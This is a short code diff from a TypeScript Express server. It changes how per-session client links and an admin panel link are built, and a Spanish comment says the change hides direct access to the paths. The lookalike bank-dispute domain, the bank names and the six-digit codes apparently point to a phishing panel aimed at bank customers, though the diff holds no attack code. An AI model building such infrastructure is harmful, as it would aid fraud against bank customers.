@@ -816,8 +816,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const adminDomain = process.env.ADMIN_DOMAIN || 'panel.invexaclaracion.com';
 
       // Armamos los enlaces para ambos dominios
-      const clientLink = `https://${clientDomain}/client/${sessionId}`;
-      const adminLink = `https://${adminDomain}`;
+      // Ahora enviamos a la ruta raíz en lugar de /client/ para ocultar el acceso directo
+      const clientLink = `https://${clientDomain}/${sessionId}`;
+      const adminLink = `https://${adminDomain}/Balonx`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
       console.log(`URL del cliente: ${clientLink}`);
